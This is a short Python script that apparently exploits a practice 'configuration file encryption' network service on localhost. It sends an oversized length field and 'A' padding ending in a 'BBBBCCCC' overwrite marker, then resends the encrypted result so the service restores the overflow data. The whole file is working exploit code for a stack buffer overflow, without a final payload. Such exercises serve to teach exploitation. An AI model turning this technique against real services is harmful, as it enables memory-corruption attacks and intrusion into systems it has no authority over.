import socket
import threading
import struct
import sys

HOST = "127.0.0.1"
PORT = 20002
s = socket.socket()
s.connect((HOST,PORT))
 # 'E\x00\x02\x00\x00' + 'D'*131072
buffer_len = 0x2000c

ln = s.recv(len("[-- Enterprise configuration file encryption service --]\n"))
print (ln)

op = "E"
size = struct.pack("I", buffer_len+0x8)
padding = 'A'*buffer_len + 'BBBBCCCC'

s.send (op + size + padding)
ln = s.recv(len("[-- encryption complete. please mention 474bd3ad-c65b-47ab-b041-602047ab8792 to support staff to retrieve your file --]\n"))
print (ln)
tmp_size = s.recv(4)
s.recv(1024)
print (struct.unpack("I", tmp_size))
enc = s.recv(buffer_len+0x8)
# print (enc)
s.send(op + size + enc + 'Q')
